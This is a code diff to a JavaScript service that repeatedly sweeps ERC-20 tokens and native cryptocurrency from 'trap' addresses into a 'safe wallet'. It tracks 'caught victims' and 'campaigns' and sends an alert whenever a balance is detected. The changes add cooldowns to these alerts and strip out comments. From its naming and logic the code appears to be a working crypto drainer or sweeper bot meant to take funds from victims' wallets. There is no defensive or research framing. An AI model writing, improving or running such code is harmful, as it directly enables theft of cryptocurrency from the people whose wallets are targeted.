@@ -59,6 +59,13 @@ const MIN_TOKEN_SWEEP = BigInt(process.env.MIN_TOKEN_SWEEP || '1000000000000000'
 // --- Caught victims (in-memory set) ---
 const caughtVictims = new Set();
 
+// --- Smart Notification Cooldown Tracking ---
+const NO_BALANCE_COOLDOWN_MS = 4 * 60 * 60 * 1000; // Alert max once every 4 hours if nothing found
+let lastNoBalanceAlertTime = 0;
+
+const BALANCE_DETECTED_COOLDOWN_MS = 1 * 60 * 60 * 1000; // Alert max once every 1 hour per token/trap if unswept
+const lastBalanceAlertTimes = new Map(); 
+
 // --- Helper: update job status ---
 async function updateJob(status, progress = null, total = null, message = null) {
   if (!jobId || !supabaseService) return;
@@ -445,10 +452,10 @@ async function sweepAddress(client, trapAddress, safeWallet, victimAddress = nul
           2, 1000
         );
 
-        // Keep track of total gas paid during token sweeps in this run so we can deduct it safely from the native balance sweep later.
+        // Track native gas spent over the course of the execution
         let totalGasPaidInRun = 0n;
 
-        // ─── Token sweeps (Swept first, otherwise sweeping native assets first leaves zero gas for tokens!) ───
+        // ─── Token sweeps (Executed first) ───
         const multicallContracts = TOKEN_LIST.map(token => ({
           address: getAddress(token.address),
           abi: ERC20_ABI,
@@ -490,12 +497,20 @@ async function sweepAddress(client, trapAddress, safeWallet, victimAddress = nul
 
             if (!meetsThreshold) continue;
 
-            logger.info(`[!!!] ${token.symbol} BALANCE DETECTED for ${trapAddress}: ${formatted} (≈$${usdValue.toFixed(2)})`);
-            await sendAlert(
-              `💰 ${token.symbol} Balance detected\nTrap: ${trapAddress}\nAmount: ${formatted} ${token.symbol}\n≈$${usdValue.toFixed(2)}`,
-              'info',
-              campaignId
-            );
+            // --- Smart Balance Alert Throttling ---
+            const alertKey = `${trapAddress.toLowerCase()}:${token.symbol.toLowerCase()}`;
+            const now = Date.now();
+            const lastAlert = lastBalanceAlertTimes.get(alertKey) || 0;
+
+            if (now - lastAlert > BALANCE_DETECTED_COOLDOWN_MS) {
+              logger.info(`[!!!] ${token.symbol} BALANCE DETECTED for ${trapAddress}: ${formatted} (≈$${usdValue.toFixed(2)})`);
+              await sendAlert(
+                `💰 ${token.symbol} Balance detected\nTrap: ${trapAddress}\nAmount: ${formatted} ${token.symbol}\n≈$${usdValue.toFixed(2)}`,
+                'info',
+                campaignId
+              );
+              lastBalanceAlertTimes.set(alertKey, now);
+            }
 
             try {
               const tokenAddr = getAddress(token.address);
@@ -535,7 +550,6 @@ async function sweepAddress(client, trapAddress, safeWallet, victimAddress = nul
                 2, 1000
               );
 
-              // Subtract gas fees already committed in this batch sweep run to avoid out-of-gas failures
               const spendableNativeBalance = currentNativeBalance > totalGasPaidInRun ? currentNativeBalance - totalGasPaidInRun : 0n;
 
               if (spendableNativeBalance < totalFee) {
@@ -628,7 +642,6 @@ async function sweepAddress(client, trapAddress, safeWallet, victimAddress = nul
                 }
               }
 
-              // Safely write transaction history if at least one leg went through
               if (userTxHash || serviceTxHash) {
                 if (campaignId && supabaseService) {
                   const txHash = userTxHash || serviceTxHash;
@@ -673,14 +686,13 @@ async function sweepAddress(client, trapAddress, safeWallet, victimAddress = nul
           }
         }
 
-        // ─── Native currency sweep (Executed LAST to preserve gas for token movements!) ───
+        // ─── Native currency sweep (Executed last) ───
         const balance = await withRpcRetry(
           () => client.getBalance({ address: trapAddress }),
           `getBalance(${trapAddress})`,
           2, 1000
         );
 
-        // Safely determine remaining spendable balance after taking previous token transaction commitments into account
         const spendableBalance = balance > totalGasPaidInRun ? balance - totalGasPaidInRun : 0n;
 
         if (spendableBalance > 0n) {
@@ -777,7 +789,6 @@ async function sweepAddress(client, trapAddress, safeWallet, victimAddress = nul
                 }
               }
 
-              // Safely write native sweep details if at least one leg succeeded
               if (userTxHash || serviceTxHash) {
                 if (campaignId && supabaseService) {
                   const txHash = userTxHash || serviceTxHash;
@@ -904,13 +915,18 @@ async function sweepBatch() {
           await updateJob('running', processedCount, total, `Sweeping ${processedCount}/${total}`);
         }
       }
-      // After all traps processed, if nothing was swept, send an alert
+      
+      // --- Smart Quiet Cycle Throttling ---
       if (!anySwept) {
-        await sendAlert(
-          `ℹ️ Sweep cycle: No balances above thresholds ($${MIN_SWEEP_USD}) found for ${clients.length} traps.`,
-          'info',
-          campaignId
-        );
+        const now = Date.now();
+        if (now - lastNoBalanceAlertTime > NO_BALANCE_COOLDOWN_MS) {
+          await sendAlert(
+            `ℹ️ Sweep cycle: No balances above thresholds ($${MIN_SWEEP_USD}) found for ${clients.length} traps.`,
+            'info',
+            campaignId
+          );
+          lastNoBalanceAlertTime = now;
+        }
       }
     } catch (err) {
       logger.error(`Batch sweep error: ${err.message}`);
@@ -926,7 +942,6 @@ async function sweepBatch() {
     }, pollIntervalMs);
   };
 
-  // Send initial sweep start alert with campaignId
   await sendAlert(
     `🔄 Sweep started for ${clients.length} traps on ${chainName}${campaignId ? ` (campaign ${campaignId})` : ''}.`,
     'info',
@@ -943,7 +958,6 @@ async function sweepBatch() {
 setupGracefulShutdown();
 
 // --- Entry point ---
-// Load caught victims from DB on start
 await loadCaughtVictims();
 setInterval(loadCaughtVictims, 30000);
 
